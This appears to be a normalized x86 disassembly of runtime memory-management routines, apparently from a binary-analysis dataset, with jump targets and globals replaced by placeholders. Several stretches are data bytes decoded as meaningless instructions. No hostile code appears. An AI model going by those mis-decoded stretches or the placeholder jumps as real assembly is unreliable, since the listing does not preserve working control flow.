cmp edi ebp
jb r-xdata
mov eax esi
mov edx edi
sub esi ebx
sbb edi ebp
inc eax
cmp esi ebx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_44a4f7
cmp cl 0x20
jl r-xdata
shld edx eax cl
shl eax cl
retn
cmp cl 0x40
jl r-xdata
mov edx eax
shl edx cl
xor eax eax
retn
xor edx edx
xor eax eax
retn
sub_44a513
cmp cl 0x20
jl r-xdata
shrd eax edx cl
sar edx cl
retn
cmp cl 0x40
jl r-xdata
mov eax edx
cdq
sar eax cl
retn
sar edx 0x1f
mov eax edx
retn
sub_44a52f
cmp cl 0x20
jl r-xdata
shrd eax edx cl
shr edx cl
retn
cmp cl 0x40
jl r-xdata
mov eax edx
xor edx edx
shr eax cl
retn
xor edx edx
xor eax eax
retn
sub_44a54c
push eax
movsd [ edi ] [ esi ]
inc esp
add [ ebx ] al
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ebp + 0x44 ] cl
add [ 0x736c6146 ] al
add al 0x54
jb r-xdata
add [ eax ] al
add [ esi ] dl
nop
nop
nop
js r-xdata
jl r-xdata
inc esp
add [ edx ] al
add al 0x43
push 0x17261
add [ eax ] al
add bh bh
add [ eax ] al
add [ eax + r-xdata ] dl
add [ edi ] eax
dec ecx
outsb
je r-xdata
mov eax edx
cdq
sar eax cl
retn
sar edx 0x1f
mov eax edx
retn
add [ eax - 0x5bffbb3e ] ah
retn 0x44
jb r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
nop
nop
movsb [ edi ] [ esi ]
movsd [ edi ] [ esi ]
inc esp
add [ ecx ] al
add al 0x42
jns r-xdata
cmpsb [ esi ] [ edi ]
inc esp
add [ edi ] al
pop es
add [ gs : eax ] eax
add [ eax ] al
add bh bh
add [ eax ] al
add [ eax + r-xdata ] dl
add [ edi + edx * 2 ] eax
outsd
jb r-xdata
mov ah [ esi + 0x80044 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
nop
add al 0xa7
inc esp
add [ esi + 0x44a6 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + edx - 0x5a ] si
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] al
push ebx
jns r-xdata
inc esp
add [ eax + eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esp eax
retn 0x44
add eax [ eax ]
add [ eax ] al
add bh bh
inc [ eax ]
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al 0xa6
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
insd
add [ eax ] al
inc eax
cmpsb [ esi ] [ edi ]
inc esp
add [ edi ] cl
or [ ecx + 0x55 ] cl
outsb
imul ebp [ esi + 0x6f ] 0x77
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
push es
push ebx
jns r-xdata
inc esp
add [ eax + eax ] cl
add [ eax ] al
enter 0x44a5 0x0
xchg esp eax
retn 0x44
add [ eax ] al
add al 0xa7
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
add [ eax ] al
int3
sub_44a600
test al 0xc2
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add [ eax ] bl
rol [ eax + eax + 0x60 ] 0xc0
inc esp
add [ edi ] al
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax - 0x5a ] si
inc esp
add [ edi ] al
pop es
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + edx - 0x5a ] si
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] al
push ebx
jns r-xdata
mov ah [ esi + 0x80044 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
nop
add al 0xa7
inc esp
add [ esi + 0x44a6 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] al
je r-xdata
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
insd
add [ eax ] al
inc eax
cmpsb [ esi ] [ edi ]
inc esp
add [ edi ] cl
or [ ecx + 0x55 ] cl
outsb
imul ebp [ esi + 0x6f ] 0x77
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
push es
push ebx
jns r-xdata
inc esp
add [ eax + eax ] cl
add [ eax ] al
enter 0x44a5 0x0
xchg esp eax
retn 0x44
add [ eax ] al
add al 0xa7
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
add [ eax ] al
int3
sub_44a68a
imul esp [ esi - 0x598cffbc ] 0xa67d0044
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
mov ah [ esi + 0x80044 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
nop
add al 0xa7
inc esp
add [ esi + 0x44a6 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] al
inc esp
add [ eax + eax ] cl
add [ eax ] al
enter 0x44a5 0x0
xchg esp eax
retn 0x44
sub_44a73c
push ebx
push esi
mov esi rw-data
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov [ esi ] edx
pop esi
pop ebx
retn
push 0x644
push 0x0
call LocalAlloc
mov ecx eax
test ecx ecx
jne r-xdata
mov eax [ rw-data ]
mov [ ecx ] eax
mov [ rw-data ] ecx
xor edx edx
xor eax eax
pop esi
pop ebx
retn
mov eax edx
add eax eax
lea eax [ ecx + eax * 8 + 0x4 ]
mov ebx [ esi ]
mov [ eax ] ebx
mov [ esi ] eax
inc edx
cmp edx 0x64
jne r-xdata
sub_44a794
push ebx
push esi
mov esi edx
mov ebx eax
call sub_44a73c
test eax eax
jne r-xdata
mov edx [ esi ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebx ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ edx + 0x4 ] eax
mov [ ebx ] eax
mov al 0x1
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_44a7dc
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov [ esp ] edx
mov ebp eax
mov ebx [ ebp ]
mov eax [ esp ]
mov edx [ eax ]
mov [ esi ] edx
mov edx [ eax + 0x4 ]
mov [ esi + 0x4 ] edx
mov edx [ esi ]
add edx [ esi + 0x4 ]
cmp eax edx
jne r-xdata
mov eax ebx
call sub_44a7c4
mov eax [ ebx + 0x8 ]
mov [ esi ] eax
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
jmp r-xdata
mov ebx edi
cmp ebp ebx
jne r-xdata
mov eax ebx
call sub_44a7c4
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
mov edi [ ebx ]
mov eax [ ebx + 0x8 ]
mov edx eax
add edx [ ebx + 0xc ]
cmp edx [ esi ]
jne r-xdata
mov edx esi
mov eax ebp
call sub_44a794
test al al
jne r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ esi ] eax
sub_44a850
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx eax
mov edi ebx
mov ebx [ ebx ]
cmp edi ebx
jne r-xdata
mov ecx esi
add ecx [ edx + 0x4 ]
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
ja r-xdata
mov esi [ edx ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jb r-xdata
xor eax eax
cmp esi eax
jne r-xdata
mov ecx [ edx ]
mov esi [ edx + 0x4 ]
add ecx esi
mov edi eax
add edi [ ebx + 0xc ]
cmp ecx edi
jne r-xdata
mov eax [ edx + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ edx + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx [ edx + 0x4 ]
mov [ esp ] ecx
sub edi ecx
mov [ esp + 0x4 ] edi
mov edx [ edx ]
sub edx eax
mov [ ebx + 0xc ] edx
mov edx esp
mov eax ebx
call sub_44a794
test al al
jne r-xdata
sub [ ebx + 0xc ] esi
jmp r-xdata
mov al 0x1
jmp r-xdata
mov eax ebx
call sub_44a7c4
jmp r-xdata
xor eax eax
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_44a8e0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp esi 0x100000
jge r-xdata
add esi 0xffff
and esi 0xffff0000
mov esi 0x100000
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_44a794
test al al
jne r-xdata
mov [ ebx + 0x4 ] esi
push 0x1
push 0x2000
push esi
push 0x0
call VirtualAlloc
mov edi eax
mov [ ebx ] edi
test edi edi
je r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call VirtualFree
xor eax eax
mov [ ebx ] eax
sub_44a944
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov ebp eax
mov [ ebx + 0x4 ] 0x100000
push 0x4
push 0x2000
push 0x100000
push ebp
call VirtualAlloc
mov edi eax
mov [ ebx ] edi
test edi edi
jne r-xdata
cmp [ ebx ] 0x0
je r-xdata
add esi 0xffff
and esi 0xffff0000
mov [ ebx + 0x4 ] esi
push 0x4
push 0x2000
push esi
push ebp
call VirtualAlloc
mov [ ebx ] eax
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_44a794
test al al
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call VirtualFree
xor eax eax
mov [ ebx ] eax
sub_44a9bc
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov [ esp + 0x8 ] 0xffffffff
xor edx edx
mov [ esp + 0xc ] edx
mov ebp eax
mov eax [ esp ]
add eax ebp
mov [ esp + 0x10 ] eax
mov ebx [ rw-data ]
jmp r-xdata
cmp ebx rw-data
jne r-xdata
mov edi [ ebx ]
mov esi [ ebx + 0x8 ]
cmp ebp esi
ja r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
cmp [ esp + 0xc ] 0x0
je r-xdata
mov ebx edi
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0x10 ]
ja r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov [ eax ] edx
mov eax [ esp + 0xc ]
sub eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
cmp esi [ esp + 0x8 ]
jae r-xdata
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0xc ]
jbe r-xdata
mov [ esp + 0x8 ] esi
push 0x8000
push 0x0
push esi
call VirtualFree
test eax eax
jne r-xdata
mov [ esp + 0xc ] eax
mov eax ebx
call sub_44a7c4
mov [ rw-data ] 0x1
sub_44aa74
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edx eax
mov ebp edx
and ebp 0xfffff000
add edx [ esp ]
add edx 0xfff
and edx 0xfffff000
mov [ esp + 0x8 ] edx
mov eax [ esp + 0x4 ]
mov [ eax ] ebp
mov eax [ esp + 0x8 ]
sub eax ebp
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebp ebx
jbe r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi [ esp + 0x8 ]
jbe r-xdata
mov ebx ebp
cmp edi ebx
jbe r-xdata
mov edi [ esp + 0x8 ]
mov esi [ esi ]
push 0x4
push 0x1000
sub edi ebx
push edi
push ebx
call VirtualAlloc
test eax eax
jne r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
sub_44ab08
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov esi ebx
add esi 0xfff
and esi 0xfffff000
mov [ esp ] esi
mov ebp ebx
add ebp edx
and ebp 0xfffff000
mov eax [ esp ]
mov [ ecx ] eax
mov eax ebp
sub eax [ esp ]
mov [ ecx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebx [ esp ]
jae r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebp edi
jae r-xdata
mov ebx [ esp ]
cmp edi ebx
jbe r-xdata
mov edi ebp
mov esi [ esi ]
push 0x4000
sub edi ebx
push edi
push ebx
call VirtualFree
test eax eax
jne r-xdata
mov [ rw-data ] 0x2
sub_44ab88
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov edi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
jne r-xdata
cmp edi [ ebx + 0xc ]
jg r-xdata
mov edx esi
mov eax edi
call sub_44a8e0
cmp [ esi ] 0x0
je r-xdata
mov ebx [ ebx ]
mov ecx esi
mov edx edi
mov eax [ ebx + 0x8 ]
call sub_44aa74
cmp [ esi ] 0x0
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx esi
mov eax ebp
call sub_44a7dc
cmp [ esp ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esi + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ebx [ ebp ]
jmp r-xdata
mov ecx esp
mov edx [ esi + 0x4 ]
mov eax [ esi ]
call sub_44a9bc
xor eax eax
mov [ esi ] eax
mov eax ebx
call sub_44a7c4
jmp r-xdata
sub_44ac18
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
je r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_44a944
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp edi [ ebx + 0xc ]
jle r-xdata
mov ebx [ ebx ]
mov ebp [ ebx + 0x8 ]
cmp esi ebp
jne r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_44a7dc
cmp [ esp + 0xc ] 0x0
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
sub edx [ ebx + 0xc ]
mov eax [ ebx + 0x8 ]
add eax [ ebx + 0xc ]
call sub_44a944
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
cmp edi [ ebx + 0xc ]
jg r-xdata
mov ebx [ ebp ]
jmp r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_44a9bc
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_44a7dc
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov ecx [ esp ]
mov edx edi
mov eax ebp
call sub_44aa74
mov eax [ esp ]
cmp [ eax ] 0x0
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_44a9bc
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
mov eax [ esp ]
mov eax [ eax + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esp ]
mov eax [ eax + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax ebx
call sub_44a7c4
jmp r-xdata
sub_44ad3c
push ebx
push esi
push edi
add esp 0xffffffec
mov edi ecx
mov [ esp ] edx
lea ebx [ eax + 0x3fff ]
and ebx 0xffffc000
mov esi [ esp ]
add esi eax
and esi 0xffffc000
cmp ebx esi
jae r-xdata
xor eax eax
mov [ edi ] eax
mov ecx edi
mov edx esi
sub edx ebx
mov eax ebx
call sub_44ab08
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax rw-data
call sub_44a7dc
mov ebx [ esp + 0x4 ]
test ebx ebx
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax ebx
call sub_44a9bc
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax [ esp + 0x10 ]
mov [ esp + 0x8 ] eax
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x4 ]
mov eax rw-data
call sub_44a850
jmp r-xdata
sub_44adc8
push ebp
mov ebp esp
xor edx edx
push ebp
push sub_44ae7e
push [ fs : edx ]
mov [ fs : edx ] esp
push rw-data
call InitializeCriticalSection
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_44a78c
mov eax rw-data
call sub_44a78c
mov eax rw-data
call sub_44a78c
push 0xff8
push 0x0
call LocalAlloc
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push rw-data
call EnterCriticalSection
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ae85
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x3
retn
push rw-data
call LeaveCriticalSection
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + eax * 4 - 0xc ] ecx
inc eax
cmp eax 0x401
jne r-xdata
mov eax rw-data
mov [ eax + 0x4 ] eax
mov [ eax ] eax
mov [ rw-data ] eax
mov [ rw-data ] 0x1
sub_44ae8c
push ebp
mov ebp esp
push ebx
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
pop ebp
retn
xor edx edx
push ebp
push sub_44af62
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
mov eax [ rw-data ]
push eax
call LocalFree
xor eax eax
mov [ rw-data ] eax
mov ebx [ rw-data ]
jmp r-xdata
push rw-data
call EnterCriticalSection
cmp ebx rw-data
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx + 0x8 ]
push eax
call VirtualFree
mov ebx [ ebx ]
mov eax rw-data
call sub_44a78c
mov eax rw-data
call sub_44a78c
mov eax rw-data
call sub_44a78c
mov eax [ rw-data ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
mov [ rw-data ] edx
push eax
call LocalFree
mov eax [ rw-data ]
test eax eax
jne r-xdata
push rw-data
call DeleteCriticalSection
retn
push rw-data
call LeaveCriticalSection
sub_44af6c
push ebx
cmp eax [ rw-data ]
jne r-xdata
mov edx [ eax + 0x4 ]
mov ecx [ eax + 0x8 ]
cmp ecx 0x1000
jg r-xdata
mov edx [ eax + 0x4 ]
mov [ rw-data ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
cmp eax edx
jne r-xdata
test ecx ecx
jns r-xdata
test ecx ecx
jns r-xdata
sar ecx 0x2
mov ebx [ rw-data ]
mov [ ebx + ecx * 4 - 0xc ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
pop ebx
retn
add ecx 0x3
sar ecx 0x2
mov eax [ rw-data ]
xor edx edx
mov [ eax + ecx * 4 - 0xc ] edx
jmp r-xdata
add ecx 0x3
pop ebx
retn
sub_44afd0
mov edx [ rw-data ]
jmp r-xdata
cmp edx rw-data
jne r-xdata
mov ecx [ edx + 0x8 ]
cmp eax ecx
jb r-xdata
mov [ rw-data ] 0x3
xor edx edx
mov edx [ edx ]
add ecx [ edx + 0xc ]
cmp eax ecx
jb r-xdata
mov eax edx
retn
sub_44b000
push ebx
mov ecx edx
sub ecx 0x4
lea ebx [ ecx + eax ]
cmp edx 0x10
jl r-xdata
cmp edx 0x4
jl r-xdata
mov [ ebx ] 0x80000007
mov edx ecx
call sub_44b1bc
pop ebx
retn
pop ebx
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
mov [ ebx ] ecx
sub_44b054
cmp edx 0xc
jl r-xdata
cmp edx 0x4
jl r-xdata
or edx 0x2
mov [ eax ] edx
add eax 0x4
call sub_44b030
retn
add eax edx
and [ eax ] 0xfffffffe
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
sub_44b07c
push ebx
push esi
mov edx eax
sub edx 0x4
mov edx [ edx ]
mov ecx edx
and ecx 0x80000002
cmp ecx 0x80000002
je r-xdata
mov ebx edx
and ebx 0x7ffffffc
sub eax ebx
mov ecx eax
xor edx [ ecx ]
test edx 0xfffffffe
je r-xdata
mov [ rw-data ] 0x4
test [ ecx ] 0x1
je r-xdata
mov [ rw-data ] 0x5
mov eax ebx
pop esi
pop ebx
retn
mov edx eax
sub edx 0xc
mov esi [ edx + 0x8 ]
sub eax esi
cmp esi [ eax + 0x8 ]
je r-xdata
call sub_44af6c
add ebx esi
mov [ rw-data ] 0x6
sub_44b0ec
push ebx
push esi
push edi
mov ebx eax
xor edi edi
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
test al 0x2
jne r-xdata
and eax 0x7ffffffc
add edi eax
add ebx eax
mov eax [ ebx ]
mov eax edi
pop edi
pop esi
pop ebx
retn
mov esi ebx
mov eax esi
call sub_44af6c
mov eax [ esi + 0x8 ]
add edi eax
add ebx eax
and [ ebx ] 0xfffffffe
sub_44b124
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov edi edx
mov esi eax
mov eax esi
call sub_44afd0
mov ebx eax
mov ebp [ ebx + 0x8 ]
mov eax ebp
add eax [ ebx + 0xc ]
mov edx eax
lea ecx [ edi + esi ]
sub edx ecx
cmp edx 0xc
jg r-xdata
mov eax esi
sub eax ebp
cmp eax 0xc
jge r-xdata
mov edi eax
sub edi esi
mov ecx esp
mov edx edi
sub edx 0x4
lea eax [ esi + 0x4 ]
call sub_44ad3c
mov ecx esp
mov edx esi
sub edx [ ebx + 0x8 ]
add edx edi
mov eax ebp
call sub_44ad3c
jmp r-xdata
mov edx ebp
sub edx esi
mov eax esi
call sub_44b000
mov eax ebp
add eax [ esp + 0x4 ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jae r-xdata
xor eax eax
jmp r-xdata
mov ebp [ esp ]
test ebp ebp
jne r-xdata
mov edx esp
mov eax ebx
call sub_44a850
mov al 0x1
lea edx [ edi + esi ]
sub edx eax
call sub_44b054
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_44b1bc
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx edi
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
sub eax 0xc
mov [ eax + 0x8 ] esi
cmp esi 0x1000
jg r-xdata
cmp esi 0x3c00
jl r-xdata
mov edx esi
test edx edx
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ebx
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
mov edx esi
mov eax edi
call sub_44b124
test al al
jne r-xdata
sar edx 0x2
mov eax [ rw-data ]
mov eax [ eax + edx * 4 - 0xc ]
test eax eax
jne r-xdata
add edx 0x3
pop edi
pop esi
pop ebx
retn
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
jmp r-xdata
mov eax [ rw-data ]
mov [ eax + edx * 4 - 0xc ] ebx
mov [ ebx + 0x4 ] ebx
mov [ ebx ] ebx
jmp r-xdata
sub_44b244
cmp [ rw-data ] 0x0
jle r-xdata
retn
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ rw-data ]
or eax 0x2
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
add eax 0x4
call sub_44b030
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] 0x7
jmp r-xdata
sub_44b290
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi esp
call sub_44b244
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax rw-data
call sub_44a7dc
mov ebx [ esp + 0x8 ]
test ebx ebx
jne r-xdata
mov eax [ edi ]
cmp ebx eax
jae r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi ]
add eax [ edi + 0x4 ]
mov esi ebx
add esi [ esp + 0xc ]
cmp eax esi
jae r-xdata
call sub_44b07c
sub [ edi ] eax
add [ edi + 0x4 ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
add eax [ edi + 0x4 ]
cmp esi eax
jne r-xdata
call sub_44b0ec
add [ edi + 0x4 ] eax
mov eax [ edi ]
mov [ rw-data ] eax
mov eax [ edi + 0x4 ]
mov [ rw-data ] eax
mov al 0x1
sub eax 0x4
mov edx 0x4
call sub_44b000
sub [ edi + 0x4 ] 0x4
sub_44b31c
push ebx
add esp 0xfffffff8
mov ebx eax
mov edx esp
lea eax [ ebx + 0x4 ]
call sub_44ab88
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_44b290
test al al
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov al 0x1
sub_44b348
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_44ac18
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_44b290
test al al
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_44b37c
xor edx edx
test eax eax
jns r-xdata
sar eax 0x2
cmp eax 0x400
jg r-xdata
add eax 0x3
mov eax edx
retn
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
jne r-xdata
inc eax
cmp eax 0x401
jne r-xdata
sub_44b3a8
push ebx
push esi
push edi
push ebp
mov esi eax
mov edi rw-data
mov ebp rw-data
mov eax ebx
call sub_44af6c
mov edx [ ebx + 0x8 ]
mov eax edx
sub eax esi
cmp eax 0xc
jl r-xdata
mov ebx [ edi ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov esi edx
cmp ebx [ edi ]
jne r-xdata
mov edx ebx
add edx esi
xchg edx eax
call sub_44b1bc
jmp r-xdata
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
and [ eax ] 0xfffffffe
mov eax [ ebx + 0x4 ]
mov [ edi ] eax
mov eax ebx
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
mov ebx [ ebx + 0x4 ]
cmp esi [ ebx + 0x8 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x8 ] eax
cmp ebx [ edi ]
je r-xdata
cmp esi 0x1000
jg r-xdata
mov [ edi ] ebx
jmp r-xdata
mov eax esi
call sub_44b31c
test al al
jne r-xdata
mov eax esi
call sub_44b37c
mov ebx eax
test ebx ebx
jne r-xdata
cmp esi [ ebp ]
jg r-xdata
xor eax eax
jmp r-xdata
mov ebx [ rw-data ]
cmp esi [ ebx + 0x8 ]
jle r-xdata
sub [ ebp ] esi
cmp [ ebp ] 0xc
jge r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
add [ rw-data ] esi
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
jmp r-xdata
add esi [ ebp ]
xor eax eax
mov [ ebp ] eax
sub_44b49c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
xor ecx ecx
push ebp
